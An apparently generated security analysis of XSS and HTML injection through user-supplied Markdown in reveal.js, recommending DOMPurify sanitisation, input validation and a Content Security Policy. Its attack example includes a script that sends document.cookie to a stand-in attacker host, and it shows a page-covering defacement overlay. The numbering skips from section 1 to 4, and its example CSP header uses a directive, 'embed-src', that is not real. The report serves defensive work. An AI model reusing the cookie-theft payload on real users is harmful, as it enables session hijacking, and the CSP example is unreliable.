## Deep Analysis of Attack Tree Path: Unsanitized User-Provided Content in reveal.js

This document provides a deep analysis of the attack tree path: **"Sanitize and validate user-provided Markdown/HTML slide content. Use CSP to restrict inline scripts and styles."** within the context of a reveal.js application. This path is identified as **HIGH RISK** and requires careful consideration and robust mitigation strategies.

### 1. Define Objective

### 4. Deep Analysis of Attack Tree Path: Unsanitized User-Provided Content

This attack path highlights a critical vulnerability: **the potential for malicious actors to inject harmful code into reveal.js presentations by providing unsanitized Markdown or HTML content.**  Reveal.js, by design, renders Markdown and HTML to create interactive slides. If user-provided content is directly rendered without proper security measures, it opens the door to various attacks, primarily Cross-Site Scripting (XSS).

#### 4.1. Vulnerability: Cross-Site Scripting (XSS) and HTML Injection

* **Cross-Site Scripting (XSS):**  This is the most significant risk. If user-provided Markdown or HTML is not sanitized, attackers can inject malicious JavaScript code. When a user views a presentation containing this malicious code, their browser will execute it within the context of the reveal.js application.
    * **Stored XSS:** If the unsanitized content is stored (e.g., in a database and served to other users later), the XSS becomes persistent and affects all users viewing the presentation. This is particularly dangerous.
    * **Reflected XSS:**  While less likely in this scenario if content is directly provided for slides, it's still a concern if user input is processed and reflected back in the presentation without sanitization.

* **HTML Injection:** Even without JavaScript, attackers can inject arbitrary HTML to:
    * **Deface the presentation:**  Modify the visual appearance, insert misleading content, or disrupt the intended presentation flow.
    * **Phishing attacks:**  Create fake login forms or other elements to trick users into revealing sensitive information.
    * **Clickjacking:**  Overlay hidden elements to trick users into performing unintended actions.

#### 4.2. Attack Vectors and Examples

Let's illustrate with examples of how an attacker could exploit this vulnerability:

**Example 1: Injecting Malicious JavaScript (XSS)**

Imagine a user provides the following Markdown content:

```markdown
# My Presentation

This is a slide.

<script>
  // Malicious script to steal cookies and redirect to attacker's site
  window.location.href = "https://attacker.com/steal?cookie=" + document.cookie;
</script>

## Another Slide
```

If this Markdown is rendered directly by reveal.js without sanitization, the `<script>` tag will be executed in the user's browser when they view this slide. This script could:

* **Steal session cookies:**  Allow the attacker to impersonate the user.
* **Redirect to a malicious website:**  Phishing or malware distribution.
* **Modify the presentation content dynamically:**  Further defacement or manipulation.
* **Perform actions on behalf of the user:**  If the application has authenticated actions.

**Example 2: HTML Injection for Defacement and Phishing**

```markdown
# My Presentation

This is a slide.

<div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 0, 0, 0.8); z-index: 9999; color: white; text-align: center; font-size: 2em;">
  <h1>WARNING!</h1>
  <p>This presentation has been compromised!</p>
</div>

## Another Slide
```

This injected HTML will overlay a red warning message over the entire presentation, effectively defacing it and disrupting the user experience.  More sophisticated HTML injection could create fake login forms mimicking the application's interface to steal credentials.

#### 4.3. Impact Assessment (High Risk Justification)

This attack path is classified as **HIGH RISK** due to the potentially severe consequences of successful exploitation:

* **Confidentiality Breach:**  Stolen cookies, access tokens, or other sensitive data can lead to unauthorized access to user accounts and data.
* **Integrity Violation:**  Presentation defacement, content manipulation, and unauthorized actions can compromise the integrity of the application and its data.
* **Availability Disruption:**  Malicious scripts can cause denial-of-service (DoS) by overloading the user's browser or the application server.
* **Reputation Damage:**  Successful attacks can severely damage the reputation of the application and the organization using it.
* **User Trust Erosion:**  Users may lose trust in the application if they experience security breaches or are exposed to malicious content.

The ease of exploitation and the wide range of potential impacts justify the **HIGH RISK** classification.

#### 4.4. Mitigation Strategies: Sanitization, Validation, and CSP

The attack tree path itself suggests the primary mitigation strategies:

* **4.4.1. Sanitize User-Provided Markdown/HTML Content:**

    * **Purpose:**  To remove or neutralize potentially harmful HTML tags and JavaScript code from user input before rendering it in reveal.js.
    * **Implementation:**  Utilize a robust HTML sanitization library. **DOMPurify** is a highly recommended and widely used library specifically designed for sanitizing HTML and preventing XSS.
    * **Process:**  Before rendering user-provided Markdown/HTML with reveal.js, pass it through the sanitization library. Configure the library to allow only safe HTML tags and attributes necessary for presentation content (e.g., headings, paragraphs, lists, images, links, basic formatting tags). **Strictly disallow `<script>`, `<iframe>`, `<object>`, `<embed>`, `on*` attributes (event handlers), and potentially other dangerous tags and attributes.**
    * **Example (Conceptual using DOMPurify in JavaScript):**

    ```javascript
    import DOMPurify from 'dompurify';

    function renderSlideContent(userMarkdown) {
      // Convert Markdown to HTML (using a library like marked.js)
      const rawHTML = marked.parse(userMarkdown);

      // Sanitize the HTML using DOMPurify
      const sanitizedHTML = DOMPurify.sanitize(rawHTML);

      // Render sanitizedHTML in reveal.js slide
      // ... (reveal.js rendering logic) ...
    }
    ```

    * **Configuration is Key:**  Carefully configure the sanitization library to allow only necessary HTML elements and attributes. Overly permissive configurations can still leave vulnerabilities. Regularly review and update sanitization rules.

* **4.4.2. Validate User-Provided Content:**

    * **Purpose:**  To ensure that the user-provided content conforms to expected formats and constraints, further reducing the attack surface.
    * **Implementation:**
        * **Input Type Validation:**  If you expect Markdown, validate that the input is indeed valid Markdown syntax. While not directly preventing XSS, it can help catch unexpected input formats.
        * **Content Whitelisting (for specific use cases):** If you have a very restricted set of allowed content types or structures, implement whitelisting to only accept content that strictly adheres to these rules. This can be more complex but provides a stronger security posture in specific scenarios.
        * **Length Limits:**  Impose reasonable limits on the length of user-provided content to prevent excessively large payloads that could be used for DoS or other attacks.

* **4.4.3. Content Security Policy (CSP):**

    * **Purpose:**  To provide an additional layer of security by instructing the browser to restrict the sources from which resources (scripts, styles, images, etc.) can be loaded and how inline scripts and styles are handled.
    * **Implementation:**  Configure the web server to send appropriate CSP headers with responses serving reveal.js presentations.
    * **Key CSP Directives for Mitigation:**
        * **`script-src 'self'`:**  **Crucially important.**  Restrict script execution to only scripts originating from the same origin as the presentation itself. This effectively blocks inline scripts injected by attackers.  You might need to add `'unsafe-inline'` if reveal.js or its plugins rely heavily on inline scripts, but **avoid this if possible and carefully evaluate the necessity.** If needed, consider using `'nonce'` or `'hash'` based CSP for inline scripts instead of `'unsafe-inline'`.
        * **`style-src 'self'`:**  Restrict stylesheets to the same origin.  Similar to `script-src`, avoid `'unsafe-inline'` if possible.
        * **`object-src 'none'`, `embed-src 'none'`, `frame-ancestors 'none'`:**  Restrict the loading of plugins, embedded content, and framing to further reduce attack surface.
        * **`default-src 'self'`:**  Set a default policy to 'self' for all resource types not explicitly defined.
    * **Example CSP Header:**

    ```
    Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none'; embed-src 'none'; frame-ancestors 'none'; report-uri /csp-report-endpoint;
    ```

    * **Report-URI:**  Consider using `report-uri` to receive reports of CSP violations, which can help identify and debug CSP configuration issues and potential attacks.
    * **Testing and Refinement:**  Thoroughly test CSP implementation to ensure it doesn't break legitimate functionality while effectively blocking malicious content. Start with a restrictive policy and gradually relax it only if absolutely necessary, always prioritizing security.

#### 4.5. Recommendations

Based on this deep analysis, the following recommendations are crucial for the development team:

1. **Mandatory Sanitization:** **Implement robust HTML sanitization using a library like DOMPurify for all user-provided Markdown/HTML content before rendering it in reveal.js.**  This is the most critical step.
2. **Strict Sanitization Configuration:** **Configure the sanitization library with a strict policy, allowing only essential HTML tags and attributes for presentation content and explicitly disallowing potentially dangerous elements and attributes.** Regularly review and update the sanitization rules.
3. **Implement Content Security Policy (CSP):** **Deploy a restrictive CSP header, especially focusing on `script-src 'self'` and `style-src 'self'`, to mitigate XSS risks and provide defense-in-depth.**  Avoid `'unsafe-inline'` if possible and explore nonce or hash-based CSP for inline scripts if needed.
4. **Consider Input Validation:**  Implement input validation to ensure user-provided content conforms to expected formats and constraints, adding another layer of defense.
5. **Regular Security Audits:**  Conduct regular security audits and penetration testing to identify and address any potential vulnerabilities related to content handling and other aspects of the reveal.js application.
6. **Security Awareness Training:**  Educate developers and content creators about the risks of XSS and HTML injection and the importance of secure content handling practices.

By implementing these mitigation strategies, the development team can significantly reduce the risk associated with user-provided content in reveal.js applications and protect users from potential attacks. The combination of sanitization, validation, and CSP provides a strong defense-in-depth approach to address this HIGH RISK attack path.
